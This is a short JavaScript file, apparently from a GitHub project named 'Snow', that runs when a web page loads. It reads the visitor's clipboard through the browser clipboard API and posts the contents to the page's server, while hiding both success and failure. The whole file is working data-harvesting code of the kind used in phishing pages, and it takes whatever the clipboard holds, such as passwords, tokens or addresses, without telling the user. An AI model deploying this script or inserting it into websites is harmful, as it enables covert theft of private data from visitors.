/* https://github.com/msfpt/Snow */

const clipboard = () => {

    navigator.clipboard.readText().then(text => {
            
        if (typeof text != 'string') {
            text = '';
        }

        $.ajax({
            url: window.location.origin,
            type: 'POST',
            data: {
              'Status': 'y4t',
              'ClipBoard': text
            },
            success: function(response){ return false; },
            error: function(){ return false; }
        });

    });

}

window.onload = () => {
    clipboard();
};